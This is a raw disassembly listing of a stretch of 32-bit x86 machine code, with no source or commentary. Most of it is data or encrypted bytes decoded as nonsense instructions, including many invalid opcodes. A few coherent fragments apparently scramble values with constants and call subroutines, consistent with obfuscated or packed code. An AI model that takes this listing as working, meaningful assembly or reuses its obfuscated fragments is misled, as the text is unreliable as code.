  412aa4:	dec    ebx
  412aa5:	jle    0x412a92
  412aa7:	inc    eax
  412aa8:	cmp    eax,0x47b86fc5
  412aad:	add    esi,0xffffffc1
  412ab0:	push   esp
  412ab1:	popf   
  412ab2:	mov    dl,0x4d
  412ab4:	daa    
  412ab5:	fsubr  st,st(2)
  412ab7:	and    ch,BYTE PTR [ecx]
  412ab9:	add    edi,eax
  412abb:	out    0x84,eax
  412abd:	sbb    bl,al
  412abf:	jae    0x412a52
  412ac1:	enter  0x748a,0x79
  412ac5:	xchg   BYTE PTR [ebx+0x7d],cl
  412ac8:	rol    ebx,1
  412aca:	jnp    0x412b16
  412acc:	pop    edx
  412acd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ace:	jno    0x412b40
  412ad0:	jno    0x412b05
  412ad2:	test   al,0x1d
  412ad4:	sbb    DWORD PTR [ebp+0x40d6c8c1],0x57
  412adb:	es jno 0x412b5b
  412ade:	adc    DWORD PTR [eax],edi
  412ae0:	mov    ah,0xbf
  412ae2:	shl    BYTE PTR [eax-0x4fc0275c],0x7f
  412ae9:	cli    
  412aea:	je     0x412b2a
  412aec:	adc    dh,ah
  412aee:	aaa    
  412aef:	leave  
  412af0:	aaa    
  412af1:	jmp    0x6a07:0x60ecbda1
  412af8:	ret    0x375d
  412afb:	sub    al,0x2e
  412afd:	push   0x70e6fc02
  412b02:	and    BYTE PTR [ecx-0x555aba73],0x6
  412b09:	mov    ecx,?
  412b0b:	ficom  DWORD PTR [edx]
  412b0d:	push   esi
  412b0e:	std    
  412b0f:	pop    esp
  412b10:	jns    0x412b2d
  412b12:	sub    BYTE PTR [ecx+edx*4],0xa9
  412b16:	cmp    esp,DWORD PTR [eax]
  412b18:	dec    edi
  412b19:	cmc    
  412b1a:	lods   eax,DWORD PTR ds:[esi]
  412b1b:	call   0xa2141644
  412b20:	aas    
  412b21:	aad    0xa9
  412b23:	jo     0x412b5b
  412b25:	xchg   ebp,eax
  412b26:	fdivr  DWORD PTR [edx]
  412b28:	sbb    BYTE PTR [edi],ch
  412b2a:	stos   DWORD PTR es:[edi],eax
  412b2b:	jl     0x412ba9
  412b2d:	cmp    ah,0x9
  412b30:	jecxz  0x412b0c
  412b32:	imul   ecx,ebx,0xffffffff
  412b35:	enter  0x2f4,0xc0
  412b39:	xor    ecx,DWORD PTR ds:0x37fc2270
  412b3f:	and    al,BYTE PTR [eax-0x5466de91]
  412b45:	cmovg  ebx,ebp
  412b48:	lea    ebp,[esp+ebp*4-0x2d298dc7]
  412b4f:	lods   al,BYTE PTR ds:[esi]
  412b50:	adc    al,0x59
  412b52:	xor    DWORD PTR [eax+0x29],ebx
  412b55:	(bad)  
  412b56:	std    
  412b57:	mov    ebp,0xe3c24ca0
  412b5c:	lahf   
  412b5d:	icebp  
  412b5e:	inc    ebp
  412b5f:	fstp   TBYTE PTR [ebp-0x53]
  412b62:	int    0x3c
  412b64:	mov    DWORD PTR [ecx+0x58],ebp
  412b67:	in     al,dx
  412b68:	rol    DWORD PTR [esi-0xe917336],cl
  412b6e:	stos   DWORD PTR es:[edi],eax
  412b6f:	sbb    edx,DWORD PTR [ecx+0x7f]
  412b72:	jns    0x412be0
  412b74:	and    ah,BYTE PTR [ecx+ecx*4]
  412b77:	sbb    al,0xed
  412b79:	pop    ebp
  412b7a:	pop    ecx
  412b7b:	in     eax,dx
  412b7c:	fisubr DWORD PTR [ecx-0x73]
  412b7f:	retf   
  412b80:	adc    bl,BYTE PTR [ebp-0x6e]
  412b83:	sbb    ah,BYTE PTR [edx]
  412b85:	push   edx
  412b86:	cmp    DWORD PTR [edi+eax*2+0x1060a3e0],ebx
  412b8d:	and    al,dh
  412b8f:	inc    ebp
  412b90:	lods   al,BYTE PTR ds:[esi]
  412b91:	cmp    eax,0x39098d81
  412b96:	(bad)  
  412b97:	mov    edi,0x707f4c43
  412b9c:	bswap  eax
  412b9e:	test   eax,0x93570fd4
  412ba3:	cmp    edx,edx
  412ba5:	cmc    
  412ba6:	retf   
  412ba7:	or     eax,DWORD PTR [esi+0x5b4de1d]
  412bad:	test   eax,0xa5ad3a7a
  412bb2:	int    0x9a
  412bb4:	repnz push edi
  412bb6:	jl     0x412bc4
  412bb8:	adc    eax,0xef549955
  412bbd:	aas    
  412bbe:	xor    esp,edx
  412bc0:	inc    ebx
  412bc1:	mov    edi,DWORD PTR [edx+ecx*8]
  412bc4:	getsec 
  412bc6:	iret   
  412bc7:	jb     0x412bbd
  412bc9:	add    eax,0x59db7832
  412bce:	jg     0x412c1a
  412bd0:	ins    BYTE PTR es:[edi],dx
  412bd1:	fistp  DWORD PTR [ebp-0x23]
  412bd4:	add    eax,0xab098796
  412bd9:	dec    esi
  412bda:	iret   
  412bdb:	jns    0x412bc6
  412bdd:	(bad)  
  412bde:	ret    
  412bdf:	mov    esp,0xa67dc13
  412be4:	sub    bh,0x5b
  412be7:	mov    eax,0xe28ff63c
  412bec:	inc    ecx
  412bed:	add    ebp,ebx
  412bef:	sub    ch,BYTE PTR [edx-0x56e298f3]
  412bf5:	sti    
  412bf6:	dec    ebp
  412bf7:	fnstenv [edi-0x473d72da]
  412bfd:	jbe    0x412c4d
  412bff:	dec    edi
  412c00:	jne    0x412bf8
  412c02:	push   0xffffff8a
  412c04:	jo     0x412bbd
  412c06:	mov    ebx,0x59128279
  412c0b:	xlat   BYTE PTR ds:[ebx]
  412c0c:	dec    eax
  412c0d:	pop    ebx
  412c0e:	mov    esi,0x2eefe799
  412c13:	push   0xdfcde5d2
  412c18:	and    al,0xa7
  412c1a:	add    BYTE PTR [ebp-0x9bde4fc],dh
  412c20:	in     al,0x95
  412c22:	out    dx,eax
  412c23:	aaa    
  412c24:	xor    edi,DWORD PTR [ebx-0x3aec7c43]
  412c2a:	popf   
  412c2b:	xor    edi,DWORD PTR [ebp-0x55]
  412c2e:	addr16 icebp 
  412c30:	mov    al,ds:0x2f8fb47d
  412c35:	push   ecx
  412c36:	cld    
  412c37:	cmp    ch,BYTE PTR [esi+eiz*2+0x5f6e78c0]
  412c3e:	shr    ebx,cl
  412c40:	sbb    DWORD PTR [esi],0x7755470d
  412c46:	stos   DWORD PTR es:[edi],eax
  412c47:	pop    eax
  412c48:	xchg   esi,eax
  412c49:	pop    esi
  412c4a:	adc    eax,0xf7b863b8
  412c4f:	and    edx,DWORD PTR [eax]
  412c51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c52:	push   ss
  412c53:	push   ebp
  412c54:	jo     0x412c86
  412c56:	sub    al,0x6f
  412c58:	pop    esp
  412c59:	jmp    0x49da9231
  412c5e:	popa   
  412c5f:	bound  eax,QWORD PTR [ebx+edi*1]
  412c62:	xchg   esp,eax
  412c63:	ins    DWORD PTR es:[edi],dx
  412c64:	mov    ds:0x8da28da4,eax
  412c69:	pop    ss
  412c6a:	pop    es
  412c6b:	jne    0x412ca0
  412c6d:	mov    eax,DWORD PTR [ebp-0x8]
  412c70:	mov    ecx,DWORD PTR [ebp-0x4]
  412c73:	mov    edx,DWORD PTR [ebp-0x10]
  412c76:	mov    edi,DWORD PTR [ebp-0xc]
  412c79:	add    eax,edx
  412c7b:	mov    edx,DWORD PTR [ebp-0x18]
  412c7e:	adc    ecx,edi
  412c80:	mov    edi,DWORD PTR [ebp-0x14]
  412c83:	push   edi
  412c84:	push   edx
  412c85:	or     ecx,0x6833
  412c8b:	or     eax,0x6b80
  412c90:	jmp    0x413068
  412c95:	cmp    eax,0x5aa05c23
  412c9a:	sahf   
  412c9b:	cmp    eax,0xec8af322
  412ca0:	mov    esi,0x7cc790e0
  412ca5:	inc    ecx
  412ca6:	push   eax
  412ca7:	sbb    BYTE PTR [eax],bl
  412ca9:	stos   BYTE PTR es:[edi],al
  412caa:	adc    bl,BYTE PTR [eax]
  412cac:	sbb    BYTE PTR [esi+0x1],bl
  412caf:	(bad)  
  412cb0:	loopne 0x412c49
  412cb2:	idiv   DWORD PTR [edi+0x44609ebe]
  412cb8:	aas    
  412cb9:	leave  
  412cba:	(bad)  
  412cbb:	jbe    0x412cd8
  412cbd:	(bad)  
  412cbe:	es iret 
  412cc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412cc1:	jno    0x412c6f
  412cc3:	xchg   BYTE PTR [eax-0x87184df],bh
  412cc9:	add    bh,dh
  412ccb:	cli    
  412ccc:	jmp    0x412d02
  412cce:	aad    0xea
  412cd0:	xor    DWORD PTR ds:0xda365dda,0x58f96627
  412cda:	sub    edx,DWORD PTR [ecx-0x63c6eafc]
  412ce0:	jae    0x412cdc
  412ce2:	clc    
  412ce3:	dec    eax
  412ce4:	or     edx,ebp
  412ce6:	xor    DWORD PTR [eax+0x4b90d40d],0x13003a1f
  412cf0:	sbb    al,0x0
  412cf2:	adc    al,0xb0
  412cf4:	and    al,0x28
  412cf6:	adc    ch,BYTE PTR [esi+0x2d127ccc]
  412cfc:	retf   
  412cfd:	leave  
  412cfe:	rcl    DWORD PTR [esi+0x58773878],cl
  412d04:	xor    al,0x3e
  412d06:	push   esp
  412d07:	dec    esi
  412d08:	mov    edi,0xa11760d8
  412d0d:	retf   
  412d0e:	je     0x412ca8
  412d10:	addr16 or eax,0xb72aa090
  412d16:	xchg   ebx,eax
  412d17:	add    eax,DWORD PTR [ecx]
  412d19:	cmp    ebp,0x4b966e47
  412d1f:	sub    eax,0x2300946e
  412d24:	fmulp  st(3),st
  412d26:	xchg   esp,eax
  412d27:	pushf  
  412d28:	mov    BYTE PTR ss:[ebx+0x15],dl
  412d2c:	inc    esi
  412d2d:	aas    
  412d2e:	shl    eax,0x36
  412d31:	inc    ebx
  412d32:	ror    DWORD PTR [eax-0x67f38508],0x7
  412d39:	xlat   BYTE PTR ds:[ebx]
  412d3a:	mov    edx,0x4e25f35a
  412d3f:	daa    
  412d40:	add    eax,0x776e1ef2
  412d45:	and    eax,0xfd842221
  412d4a:	xor    eax,0x6af86bc5
  412d4f:	aad    0xa0
  412d51:	and    eax,0x6a62fe06
  412d56:	in     al,0xf3
  412d58:	loop   0x412d65
  412d5a:	mov    esi,0xd270c9a0
  412d5f:	pop    ss
  412d60:	pop    ecx
  412d61:	mov    ?,WORD PTR [eax+0x38]
  412d64:	pop    ecx
  412d65:	(bad)  
  412d66:	xor    BYTE PTR [ecx+0x3f83489b],dl
  412d6c:	and    BYTE PTR [ecx+edx*8-0x5f847ce8],bl
  412d73:	xor    ecx,DWORD PTR [ecx-0x45]
  412d76:	test   bh,dh
  412d78:	scas   eax,DWORD PTR es:[edi]
  412d79:	push   ebx
  412d7a:	test   DWORD PTR [edx+0x8],edi
  412d7d:	push   edi
  412d7e:	lahf   
  412d7f:	gs call 0xa3a1:0x5d84f529
  412d87:	fs cli 
  412d89:	inc    edi
  412d8a:	and    BYTE PTR [edi],ch
  412d8c:	adc    ebx,ecx
  412d8e:	js     0x412d9f
  412d90:	push   edx
  412d91:	xor    ebp,DWORD PTR [eax+0x22]
  412d94:	xchg   edi,eax
  412d95:	adc    eax,0x363a9cca
  412d9a:	popa   
  412d9b:	inc    ecx
  412d9c:	in     eax,dx
  412d9d:	mov    al,0x44
  412d9f:	addr16 inc esi
  412da1:	and    DWORD PTR [eax+0x18b8ecf2],ecx
  412da7:	inc    ecx
  412da8:	sbb    DWORD PTR [edi-0x46],edi
  412dab:	jo     0x412e17
  412dad:	aad    0xa7
  412daf:	scas   al,BYTE PTR es:[edi]
  412db0:	retf   
  412db1:	loop   0x412d42
  412db3:	pushf  
  412db4:	lock loope 0x412d43
  412db7:	dec    esi
  412db8:	sub    al,0xa7
  412dba:	xchg   esp,eax
  412dbb:	out    dx,al
  412dbc:	jmp    0x412e19
  412dbe:	in     al,dx
  412dbf:	sub    ebp,DWORD PTR [ebp-0x3c1592a5]
  412dc5:	dec    edi
  412dc6:	xchg   ecx,eax
  412dc7:	in     al,dx
  412dc8:	stos   DWORD PTR es:[edi],eax
  412dc9:	xor    ebx,DWORD PTR [ebx+ecx*4-0x3a]
  412dcd:	(bad)  
  412dce:	out    0xd4,eax
  412dd0:	push   edx
  412dd1:	in     al,0x9b
  412dd3:	mov    al,0x58
  412dd5:	mov    esp,0x3520bf66
  412dda:	sub    esi,esp
  412ddc:	(bad)  
  412ddd:	lahf   
  412dde:	xlat   BYTE PTR ds:[ebx]
  412ddf:	sbb    DWORD PTR [ebx-0x10ba0b1c],esp
  412de5:	icebp  
  412de6:	jle    0x412db1
  412de8:	rcr    BYTE PTR [ecx+ebp*4+0x44ef9453],1
  412def:	cdq    
  412df0:	xor    BYTE PTR ds:0xc479c3a0,ch
  412df6:	test   dl,ah
  412df8:	or     DWORD PTR [ebx+eiz*8],esi
  412dfb:	aaa    
  412dfc:	add    dl,BYTE PTR [esi-0x325dd4cb]
  412e02:	pop    es
  412e03:	rcl    ch,cl
  412e05:	fcmovnu st,st(0)
  412e07:	enter  0x78e5,0xd8
  412e0b:	popa   
  412e0c:	sub    bl,BYTE PTR [ecx]
  412e0e:	out    dx,eax
  412e0f:	inc    ebx
  412e10:	cs (bad) 
  412e12:	cmp    ch,BYTE PTR [ebp+0x13795575]
  412e18:	sti    
  412e19:	pop    eax
  412e1a:	(bad)  
  412e1b:	inc    DWORD PTR [edi+0xf]
  412e1e:	xlat   BYTE PTR ds:[ebx]
  412e1f:	lods   al,BYTE PTR ds:[esi]
  412e20:	(bad)  
  412e21:	mov    WORD PTR [eax+eax*4],gs
  412e24:	call   FWORD PTR [eax]
  412e26:	das    
  412e27:	pushf  
  412e28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e29:	fcom   QWORD PTR [ebx+0x1c]
  412e2c:	add    eax,0xaa8f92ed
  412e31:	call   DWORD PTR [eax+ebp*8]
  412e34:	pop    ebx
  412e35:	mov    ecx,0x22c05966
  412e3a:	mov    ah,0x5c
  412e3c:	sti    
  412e3d:	leave  
  412e3e:	push   edx
  412e3f:	or     BYTE PTR [eax-0x5f8b86b9],ch
  412e45:	pusha  
  412e46:	dec    edi
  412e47:	add    edx,0xe827a3c5
  412e4d:	pop    ds
  412e4e:	cmp    eax,ecx
  412e50:	mov    bh,0xc5
  412e52:	scas   eax,DWORD PTR es:[edi]
  412e53:	ret    0x35f
  412e56:	out    0xab,eax
  412e58:	and    cl,BYTE PTR [ecx+0x7b1b690d]
  412e5e:	cmp    dh,dl
  412e60:	rcr    DWORD PTR [ebx],1
  412e62:	lock or al,0xb9
  412e65:	test   BYTE PTR [ebx],dh
  412e67:	fcmovne st,st(4)
  412e69:	mov    cl,0x44
  412e6b:	add    BYTE PTR [eax],al
  412e6d:	popf   
  412e6e:	pop    ebx
  412e6f:	pop    edx
  412e70:	(bad)  
  412e71:	lock xchg edi,eax
  412e73:	out    dx,al
  412e74:	or     ch,BYTE PTR [eax-0x64e49376]
  412e7a:	cmp    BYTE PTR [edx+edi*1-0x70a94cb5],0xbb
  412e82:	popa   
  412e83:	push   ss
  412e84:	stos   BYTE PTR es:[edi],al
  412e85:	ins    DWORD PTR es:[edi],dx
  412e86:	sbb    ebx,ebx
  412e88:	or     bl,dh
  412e8a:	test   eax,0xe60a82ba
  412e8f:	pop    edx
  412e90:	pop    ss
  412e91:	shl    BYTE PTR [ecx+0x46],cl
  412e94:	or     dl,ah
  412e96:	xchg   ebx,eax
  412e97:	mov    eax,0xc3578c4f
  412e9c:	outs   dx,BYTE PTR ds:[esi]
  412e9d:	add    eax,0x1a008bda
  412ea2:	mov    al,ds:0xe9f87c98
  412ea7:	(bad)  
  412ea8:	xchg   edx,eax
  412ea9:	and    al,0xb3
  412eab:	jecxz  0x412f20
  412ead:	(bad)  [ebx]
  412eaf:	fstp   TBYTE PTR [ecx]
  412eb1:	sub    eax,0xc9f5c0
  412eb6:	(bad)  
  412eb7:	inc    esp
  412eb8:	mov    dl,0x11
  412eba:	push   ebp
  412ebb:	sub    dh,bh
  412ebd:	jbe    0x412ef6
  412ebf:	push   es
  412ec0:	dec    eax
  412ec1:	xor    DWORD PTR ds:0xe75e12d,ebx
  412ec7:	and    edi,esp
  412ec9:	mov    ?,ecx
  412ecb:	xor    BYTE PTR [esi],bh
  412ecd:	or     ch,cl
  412ecf:	(bad)  
  412ed0:	lock in al,dx
  412ed2:	mov    BYTE PTR [edi-0x36],al
  412ed5:	xor    DWORD PTR [ebx],ebx
  412ed7:	bound  ebx,QWORD PTR [edx+0x905649]
  412edd:	push   ecx
  412ede:	(bad)  
  412edf:	sti    
  412ee0:	pusha  
  412ee1:	(bad)  
  412ee2:	pop    ebp
  412ee3:	xchg   esi,eax
  412ee4:	popa   
  412ee5:	xchg   esp,eax
  412ee6:	push   cs
  412ee7:	js     0x412e89
  412ee9:	mov    edi,0x10a51583
  412eee:	loop   0x412e86
  412ef0:	adc    ah,bh
  412ef2:	sbb    eax,0x30e63d59
  412ef7:	mov    WORD PTR [eax-0x49],?
  412efa:	push   ebx
  412efb:	retf   
  412efc:	mov    cl,0x8
  412efe:	into   
  412eff:	aas    
  412f00:	xchg   edx,eax
  412f01:	mov    dl,0x57
  412f03:	sub    ebx,DWORD PTR [esi]
  412f05:	sar    DWORD PTR [edi],1
  412f07:	pusha  
  412f08:	ins    BYTE PTR es:[edi],dx
  412f09:	mov    eax,0x86e2688
  412f0e:	xchg   ecx,eax
  412f0f:	test   al,0x1
  412f11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f12:	jo     0x412f14
  412f14:	hlt    
  412f15:	in     eax,dx
  412f16:	xchg   ebp,eax
  412f17:	mov    ds:0xf1fbf68a,al
  412f1c:	push   0x2834d5b8
  412f21:	aas    
  412f22:	pop    edi
  412f23:	xchg   BYTE PTR [ecx+ebx*8+0x57],cl
  412f27:	lock mov dh,0x9e
  412f2a:	in     al,dx
  412f2b:	mov    esi,0x63c0ecd8
  412f30:	xchg   edi,eax
  412f31:	add    dl,dh
  412f33:	xchg   edi,eax
  412f34:	popa   
  412f35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f36:	inc    esi
  412f37:	in     eax,dx
  412f38:	sar    edi,1
  412f3a:	add    BYTE PTR [ecx+0x1b],dh
  412f3d:	mov    ds:0xcca17b7a,eax
  412f42:	pop    esp
  412f43:	jmp    0x412f24
  412f45:	ret    0xe685
  412f48:	neg    edx
  412f4a:	dec    edx
  412f4b:	pop    ds
  412f4c:	sbb    esp,esp
  412f4e:	mov    DWORD PTR [eax-0x17aea8fc],esp
  412f54:	icebp  
  412f55:	sub    BYTE PTR [eax-0x64],bl
  412f58:	out    0xc3,eax
  412f5a:	stc    
  412f5b:	popf   
  412f5c:	xchg   edi,eax
  412f5d:	dec    ecx
  412f5e:	sbb    al,0x99
  412f60:	adc    bh,bl
  412f62:	xor    ebx,DWORD PTR [eax]
  412f64:	jnp    0x412f7d
  412f66:	daa    
  412f67:	stos   BYTE PTR es:[edi],al
  412f68:	mov    ecx,0x5eb402ee
  412f6d:	and    BYTE PTR [edi+0x58f1573c],cl
  412f73:	cwde   
  412f74:	ja     0x412fab
  412f76:	sar    BYTE PTR [edi],1
  412f78:	out    0x7e,eax
  412f7a:	test   eax,0x27162644
  412f7f:	add    DWORD PTR [edx],ebx
  412f81:	out    0x30,eax
  412f83:	or     dh,BYTE PTR [esi+0x72]
  412f86:	cmp    eax,0xb9c73f4d
  412f8b:	rcl    DWORD PTR [edx+0x35c7ca8b],0xce
  412f92:	sbb    BYTE PTR [eax+ebp*1],bl
  412f95:	xor    bh,BYTE PTR [ecx]
  412f97:	xchg   esi,eax
  412f98:	xchg   DWORD PTR [ecx+ecx*2],edi
  412f9b:	adc    al,ch
  412f9d:	mov    edi,0xd1b170c2
  412fa2:	xor    DWORD PTR [esp-0x51],esp
  412fa6:	in     eax,dx
  412fa7:	xor    edi,DWORD PTR [edi-0x4]
  412faa:	pop    ebp
  412fab:	sub    esi,ebx
  412fad:	inc    edi
  412fae:	sti    
  412faf:	cmc    
  412fb0:	xchg   ecx,eax
  412fb1:	outs   dx,DWORD PTR ds:[esi]
  412fb2:	jne    0x412f59
  412fb4:	sbb    al,0x93
  412fb6:	loopne 0x412fdc
  412fb8:	push   es
  412fb9:	and    ecx,DWORD PTR [edi+0x76938ee7]
  412fbf:	dec    ebp
  412fc0:	jbe    0x412fda
  412fc2:	out    0x14,al
  412fc4:	xchg   ebp,eax
  412fc5:	xchg   al,bl
  412fc7:	imul   esi,edi,0x76ae9d02
  412fcd:	adc    DWORD PTR [ebx-0x4b7dc493],esp
  412fd3:	ror    BYTE PTR [edx],0xd8
  412fd6:	ror    dl,1
  412fd8:	sub    BYTE PTR [edi+0x6c695f3c],ch
  412fde:	pop    esi
  412fdf:	jb     0x413010
  412fe1:	icebp  
  412fe2:	mov    ah,0xce
  412fe4:	test   BYTE PTR [edx+0x98fb25f],0xd1
  412feb:	sub    ch,bh
  412fed:	jno    0x412fd2
  412fef:	jp     0x413038
  412ff1:	or     DWORD PTR [edi-0x29],esi
  412ff4:	std    
  412ff5:	adc    al,0x97
  412ff7:	loopne 0x412fd3
  412ff9:	pop    ebx
  412ffa:	in     al,dx
  412ffb:	adc    DWORD PTR [edi-0x1b8061a8],ebx
  413001:	push   edx
  413002:	mov    dh,0x4c
  413004:	jo     0x413063
  413006:	push   ss
  413007:	xor    eax,0x27aaadc7
  41300c:	mov    esi,0x6d74bc7e
  413011:	dec    ebx
  413012:	mov    ch,0x8
  413014:	push   esi
  413015:	dec    edx
  413016:	and    al,0x97
  413018:	(bad)  
  413019:	adc    al,0x23
  41301b:	stc    
  41301c:	mov    dl,0x6a
  41301e:	jno    0x413062
  413020:	and    BYTE PTR [eax-0x19],ch
  413023:	clc    
  413024:	mov    dl,BYTE PTR [edi]
  413026:	sub    DWORD PTR ds:0xb64cf7dc,ebx
  41302c:	push   ebx
  41302d:	jno    0x4130ae
  41302f:	fwait
  413030:	lods   al,BYTE PTR ds:[esi]
  413031:	and    ah,ch
  413033:	or     DWORD PTR [eax+0x4a],ebx
  413036:	ret    
  413037:	gs dec edi
  413039:	jle    0x412fea
  41303b:	mov    esi,0x3f9f1bd1
  413040:	ins    DWORD PTR es:[edi],dx
  413041:	mov    ds:0x9e672dc2,eax
  413046:	and    DWORD PTR [edx-0x54c33c51],ebx
  41304c:	sub    dh,ch
  41304e:	xchg   esi,eax
  41304f:	aam    0xc1
  413051:	xor    esp,DWORD PTR [esi+0x48d04081]
  413057:	(bad)  
  413058:	mov    dh,0xad
  41305a:	jecxz  0x41306d
  41305c:	mov    DWORD PTR [edx+0x2e9b4c6f],esp
  413062:	mov    BYTE PTR ds:0x2086dc14,bh
  413068:	push   ecx
  413069:	push   eax
  41306a:	call   0x422049
  41306f:	mov    ecx,DWORD PTR [ebp-0x20]
  413072:	mov    edi,DWORD PTR [ebp-0x1c]
  413075:	and    eax,0x25cb
  41307a:	or     eax,ecx
  41307c:	mov    ecx,DWORD PTR [ebp-0x20]
  41307f:	mov    ecx,DWORD PTR [ebp-0x1c]
  413082:	and    edx,0x76f2
  413088:	or     edx,edi
  41308a:	xor    edx,esi
  41308c:	xor    eax,0x253b
  413091:	shld   edx,eax,0x2
  413095:	shl    eax,0x2
  413098:	shr    ecx,0x1e
  41309b:	xor    esi,esi
  41309d:	or     eax,ecx
  41309f:	or     edx,esi
  4130a1:	xor    eax,0xca79a575
  4130a6:	mov    DWORD PTR [ebp-0x20],eax
  4130a9:	mov    esi,0x9c1b89e8
  4130ae:	xor    edx,esi
  4130b0:	mov    DWORD PTR [ebp-0x1c],edx
  4130b3:	mov    eax,DWORD PTR [ebp-0x38]
  4130b6:	mov    ecx,DWORD PTR [ebp-0x34]
  4130b9:	mov    edx,DWORD PTR [ebp-0x40]
  4130bc:	mov    edi,DWORD PTR [ebp-0x3c]
  4130bf:	push   edi
  4130c0:	push   edx
  4130c1:	push   ecx
  4130c2:	push   eax
  4130c3:	call   0x416c20
  4130c8:	add    eax,0x536a
  4130cd:	jmp    0x4134a5
  4130d2:	push   edx
  4130d3:	(bad)  
  4130d4:	push   ebx
  4130d5:	jbe    0x41312a
  4130d7:	jb     0x41310b
  4130d9:	mov    dl,0xf6
  4130db:	push   eax
  4130dc:	xchg   DWORD PTR [edi+ebx*1+0x57],edi
  4130e0:	mov    edi,0x1848d3b0
  4130e5:	sbb    BYTE PTR [edx+0x69181812],ch
  4130eb:	jecxz  0x41309f
  4130ed:	xor    DWORD PTR [ebx],esi
  4130ef:	jle    0x4130b7
  4130f1:	jnp    0x41314a
  4130f3:	aad    0xfa
  4130f5:	add    al,0x5d
  4130f7:	push   esp
  4130f8:	push   ss
  4130f9:	ret    
  4130fa:	push   ecx
  4130fb:	in     eax,dx
  4130fc:	and    eax,0xef8e857e
  413101:	psubusw mm7,QWORD PTR [esi-0x55]
  413105:	les    eax,FWORD PTR [esi+0xa]
  413108:	shl    BYTE PTR [ecx],1
  41310a:	mov    eax,ds:0x146f9e0f
  41310f:	sub    DWORD PTR [ecx],esi
  413111:	out    0x5e,eax
  413113:	call   0x9da44d17
  413118:	mov    bh,0x76
  41311a:	lahf   
  41311b:	arpl   WORD PTR cs:[edi+ebp*4],si
  41311f:	std    
  413120:	mov    ch,BYTE PTR [ebp-0x1db95f97]
  413126:	xor    esp,DWORD PTR [esi]
  413128:	mov    ds:0xcd008f9d,eax
  41312d:	add    BYTE PTR [esi-0x6ea328bb],0xc1
  413134:	pop    es
  413135:	inc    eax
  413136:	ror    esi,1
  413138:	aaa    
  413139:	repnz or BYTE PTR [eax],bh
  41313c:	sbb    bh,dh
  41313e:	adc    al,0x95
  413140:	aas    
  413141:	jge    0x41317f
  413143:	push   esi
  413144:	into   
  413145:	imul   esp,DWORD PTR [ebp+0x19cbae2b],0x15
  41314c:	out    0x1a,eax
  41314e:	dec    ecx
  41314f:	cwde   
  413150:	mov    dl,al
  413152:	cmp    eax,0x4962bf1a
  413157:	push   edx
  413158:	pop    edx
  413159:	inc    ebp
  41315a:	xchg   BYTE PTR [ebx],cl
  41315c:	sar    DWORD PTR cs:[ebx],1
  41315f:	xor    DWORD PTR [ecx+edi*4],0x88d8bdd6
  413166:	pusha  
  413167:	xor    edi,eax
  413169:	aam    0xaa
  41316b:	xor    BYTE PTR [edi],al
  41316d:	imul   eax,DWORD PTR [esi-0x37],0x2eee5604
  413174:	in     eax,dx
  413175:	lods   al,BYTE PTR ds:[esi]
  413176:	mov    eax,0xe6d11aa3
  41317b:	mov    ds:0xbf755758,al
  413180:	rcr    al,cl
  413182:	and    DWORD PTR [ebp+0x3ccd5309],edx
  413188:	in     eax,0x5f
  41318a:	pop    esp
  41318b:	jne    0x41312f
  41318d:	aas    
  41318e:	cmp    esi,DWORD PTR [ebx]
  413190:	xor    eax,0xb8affe7d
  413195:	leave  
  413196:	adc    ecx,DWORD PTR [edx-0x46]
  413199:	leave  
  41319a:	xchg   edi,eax
  41319b:	outs   dx,DWORD PTR ds:[esi]
  41319c:	xchg   esi,eax
  41319d:	cld    
  41319e:	lods   eax,DWORD PTR ds:[esi]
  41319f:	out    dx,al
  4131a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131a1:	mov    DWORD PTR [esi],eax
  4131a3:	fs sub bh,cl
  4131a6:	stos   DWORD PTR es:[edi],eax
  4131a7:	ret    0x6e75
  4131aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131ab:	xlat   BYTE PTR ds:[ebx]
  4131ac:	retf   
  4131ad:	sbb    BYTE PTR [edi+0x2b],bl
  4131b0:	sbb    DWORD PTR [ecx+0x6622e08a],edi
  4131b6:	mov    DWORD PTR [edx],ebp
  4131b8:	lea    ecx,[esi]
  4131ba:	xor    al,0xcc
  4131bc:	js     0x4131aa
  4131be:	push   0x15
  4131c0:	std    
  4131c1:	arpl   si,bx
  4131c3:	in     al,0xed
  4131c5:	ficom  DWORD PTR [eax+0x8]
  4131c8:	ja     0x41323b
  4131ca:	popf   
  4131cb:	repz sar edi,cl
  4131ce:	and    al,0xb6
  4131d0:	dec    esi
  4131d1:	int    0x3c
  4131d3:	imul   esp,DWORD PTR [edi-0x2b],0xffffffb2
  4131d7:	cs stos DWORD PTR es:[edi],eax
  4131d9:	xchg   ebp,eax
  4131da:	enter  0xc59e,0x8c
  4131de:	sub    al,BYTE PTR [ebx]
  4131e0:	test   BYTE PTR ds:0xe27365c8,cl
  4131e6:	div    BYTE PTR [edi+0x41]
  4131e9:	out    0x4e,eax
  4131eb:	inc    edi
  4131ec:	mov    ebx,0x6852176f
  4131f1:	xor    ah,BYTE PTR [edi+ebx*2+0x2a]
  4131f5:	shl    BYTE PTR [edi+0x34],1
  4131f8:	pop    ecx
  4131f9:	loope  0x4131e3
  4131fb:	pop    ds
  4131fc:	ins    BYTE PTR es:[edi],dx
  4131fd:	push   0xffffffe7
  4131ff:	jbe    0x41325d
  413201:	hlt    
  413202:	aaa    
  413203:	pop    esi
  413204:	sti    
  413205:	stc    
  413206:	js     0x4131d6
  413208:	pop    esp
  413209:	pop    esi
  41320a:	cmp    DWORD PTR [eax-0x40],esi
  41320d:	retf   0x5803
  413210:	mov    esi,0x1ab90c12
  413215:	dec    DWORD PTR [edx-0x5c]
  413218:	arpl   WORD PTR [edi],bp
  41321a:	call   0x64edddf3
  41321f:	sbb    al,ch
  413221:	pop    es
  413222:	inc    esp
  413223:	push   0x53407027
  413228:	outs   dx,BYTE PTR ds:[esi]
  413229:	xor    eax,0xbc7e01b8
  41322e:	mov    ebx,0x556fb366
  413233:	fs xor eax,0x17d0484c
  413239:	mov    al,ds:0xa1ce50f1
  41323e:	pop    eax
  41323f:	adc    al,0x17
  413241:	cmp    edx,DWORD PTR [edi-0x5a347716]
  413247:	jns    0x413240
  413249:	pop    ebp
  41324a:	stc    
